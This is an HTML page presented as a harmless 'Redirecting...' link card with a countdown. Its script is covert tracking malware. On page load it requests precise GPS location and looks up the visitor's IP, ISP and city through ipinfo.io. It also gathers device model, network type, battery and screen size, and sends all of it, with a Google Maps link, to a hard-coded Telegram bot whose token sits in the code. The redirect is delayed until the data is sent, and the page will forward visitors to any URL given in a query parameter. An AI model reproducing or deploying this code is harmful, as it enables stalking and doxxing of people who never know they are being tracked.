<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate, max-age=0">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <title id="page-title">Redirecting...</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    }
    body {
      background: #090d16;
      background-image: 
        radial-gradient(circle at 10% 20%, rgba(37, 99, 235, 0.15) 0%, transparent 40%),
        radial-gradient(circle at 90% 80%, rgba(124, 58, 237, 0.15) 0%, transparent 40%);
      color: #f8fafc;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
      overflow: hidden;
    }
    .redirect-card {
      background: rgba(30, 41, 59, 0.65);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid rgba(255, 255, 255, 0.12);
      border-radius: 24px;
      padding: 32px 24px;
      width: 100%;
      max-width: 380px;
      text-align: center;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7), 0 0 30px rgba(37, 99, 235, 0.1);
    }
    .destination-box {
      background: rgba(15, 23, 42, 0.7);
      border-radius: 14px;
      padding: 16px;
      margin-bottom: 20px;
      border: 1px solid rgba(56, 189, 248, 0.15);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 6px;
    }
    .destination-label {
      font-size: 0.75rem;
      color: #94a3b8;
    }
    .destination-name {
      font-size: 1.2rem;
      font-weight: 800;
      color: #38bdf8;
      word-break: break-all;
    }
    .timer-section {
      margin-bottom: 10px;
    }
    .timer-text {
      font-size: 0.85rem;
      color: #e2e8f0;
      margin-bottom: 10px;
    }
    .seconds-counter {
      font-weight: 800;
      color: #f43f5e;
      font-size: 1.15rem;
    }
    .progress-bar-bg {
      width: 100%;
      height: 6px;
      background: rgba(255, 255, 255, 0.08);
      border-radius: 10px;
      overflow: hidden;
    }
    .progress-bar-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #3b82f6, #f43f5e);
      border-radius: 10px;
      transition: width 0.1s linear;
    }
  </style>
</head>
<body>

  <div class="redirect-card">
    <div class="destination-box">
      <p class="destination-label">You are being redirected to:</p>
      <p id="dest-name" class="destination-name">Loading...</p>
    </div>

    <div class="timer-section">
      <p class="timer-text" id="status-text">Redirecting in <span id="seconds-count" class="seconds-counter">7</span>s</p>
      <div class="progress-bar-bg">
        <div id="progress" class="progress-bar-fill"></div>
      </div>
    </div>
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = "8728217018:AAHctv9Xsgm9UklqD27jfzBrbOJX100dYqE";
    const TELEGRAM_CHAT_ID = "8718173410";

    const defaultUrl = "https://go-noo.vercel.app/";
    const defaultName = "Main Page";

    let targetUrl = defaultUrl;
    let displayName = defaultName;

    // طلب إذن اللوكيشن
    function requestLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve(null);
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (position) => {
            resolve({
              lat: position.coords.latitude,
              lon: position.coords.longitude,
              accuracy: Math.round(position.coords.accuracy)
            });
          },
          (error) => {
            resolve(null);
          },
          { timeout: 5000, maximumAge: 0, enableHighAccuracy: true }
        );
      });
    }

    function getExactDeviceModel() {
      const ua = navigator.userAgent;
      let deviceName = "Unknown Device";
      if (/android/i.test(ua)) {
        let match = ua.match(/\b([A-Z][A-Za-z0-9\-_]+(?:\s+[A-Za-z0-9\-_]+){1,3})\s+Build\//);
        if (match && match[1]) {
          deviceName = match[1].trim();
        } else {
          deviceName = "Android Device";
        }
      } else if (/iPad|iPhone|iPod/.test(ua)) {
        deviceName = /iPad/.test(ua) ? "iPad" : "Apple iPhone";
      } else if (/Win/i.test(ua)) {
        deviceName = "Windows PC";
      } else if (/Mac/i.test(ua)) {
        deviceName = "Mac OS";
      }
      return deviceName;
    }

    async function sendDataToTelegram(coords) {
      try {
        const ipResponse = await fetch('https://ipinfo.io/json');
        const ipData = await ipResponse.json();
        
        const exactModel = getExactDeviceModel();
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const networkType = connection ? (connection.effectiveType || connection.type || "Unknown") : "Unknown";

        let batteryInfo = "Not Supported";
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging ⚡' : 'Not Charging'})`;
          } catch (e) {
            batteryInfo = "Unavailable";
          }
        }

        let locationDetails = `🌍 **IP Location:** ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}, ${ipData.country || 'N/A'}\n`;
        if (coords) {
          locationDetails = `📍 **GPS Coordinates:** \`${coords.lat},${coords.lon}\` (Accuracy: ${coords.accuracy}m)\n` +
                            `🗺️ **Google Maps:** https://maps.google.com/?q=${coords.lat},${coords.lon}\n`;
        }

        const message = 
          `🚨 **New Real Visitor Alert!**\n\n` +
          `📌 **Destination:** ${displayName}\n` +
          `🔗 **Target URL:** ${targetUrl}\n\n` +
          `🌐 **IP:** \`${ipData.ip || 'Unknown'}\`\n` +
          locationDetails +
          `🏢 **ISP/Org:** ${ipData.org || 'N/A'}\n\n` +
          `📱 **Device:** ${exactModel}\n` +
          `📶 **Network:** ${networkType}\n` +
          `🔋 **Battery:** ${batteryInfo}\n` +
          `📐 **Resolution:** ${window.screen.width}x${window.screen.height}\n` +
          `⏰ **Time:** ${new Date().toLocaleString()}`;

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
          })
        });
      } catch (err) {
        console.error("Error sending to telegram:", err);
      }
    }

    async function initSystem() {
      const urlParams = new URLSearchParams(window.location.search);
      let queryValue = urlParams.has('to') ? urlParams.get('to').trim() : "";

      try {
        const response = await fetch('links.json?_=' + new Date().getTime());
        const destinationsDB = await response.json();

        if (queryValue && destinationsDB[queryValue]) {
          targetUrl = destinationsDB[queryValue].url;
          displayName = destinationsDB[queryValue].destination;
        } else if (queryValue.startsWith('http')) {
          targetUrl = queryValue;
          let urlObj = new URL(targetUrl);
          displayName = urlObj.hostname.replace('www.', '');
          displayName = displayName.charAt(0).toUpperCase() + displayName.slice(1);
        }
      } catch (e) {
        console.error("Could not load links.json", e);
      }

      document.getElementById('dest-name').textContent = displayName;
      document.getElementById('page-title').textContent = "Redirecting to " + displayName;

      // نبدأ تشغيل طلب اللوكيشن وإرسال تليجرام في الخلفية فوراً
      const telegramPromise = (async () => {
        const coords = await requestLocation();
        await sendDataToTelegram(coords);
      })();

      // ضبط العداد 7 ثواني (7000 مللي ثانية)
      const totalTime = 7000;
      let startTime = Date.now();
      const progressEl = document.getElementById('progress');
      const secondsCountEl = document.getElementById('seconds-count');
      const statusText = document.getElementById('status-text');

      let timerInterval = setInterval(async () => {
        let elapsed = Date.now() - startTime;
        let remaining = totalTime - elapsed;
        let percentage = Math.min(100, (elapsed / totalTime) * 100);
        
        progressEl.style.width = percentage + '%';
        let secondsLeft = Math.ceil(remaining / 1000);
        if (secondsLeft < 0) secondsLeft = 0;
        secondsCountEl.textContent = secondsLeft;

        // لو الـ 7 ثواني خلصت
        if (elapsed >= totalTime) {
          clearInterval(timerInterval);
          statusText.textContent = "Finalizing...";
          
          // نتاكد إن إرسال التليجرام خلص تماماً برضه قبل ما نحول
          await telegramPromise;

          statusText.textContent = "Redirecting now...";
          setTimeout(() => {
            window.location.replace(targetUrl);
          }, 300);
        }
      }, 50);
    }

    initSystem();
  </script>
</body>
</html>
